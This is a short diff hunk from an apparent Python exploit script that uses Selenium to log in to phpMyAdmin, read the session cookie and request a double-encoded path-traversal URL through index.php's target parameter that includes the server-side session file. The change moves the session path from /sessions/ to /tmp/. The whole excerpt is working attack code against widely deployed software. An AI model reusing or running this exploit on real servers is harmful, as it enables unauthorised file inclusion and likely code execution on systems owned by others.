@@ -22,7 +22,7 @@ def exp(host):
     driver.find_element_by_id("input_go").click()
     cookie = driver.get_cookies()
     phpadmin_session=cookie[1]['value']
-    url=host+'/index.php?target=db_sql.php%253f/../../../../../../../../sessions/sess_'+phpadmin_session
+    url=host+'/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_'+phpadmin_session
     driver.get(url)
 
     check =driver.find_element_by_id('page_content').text
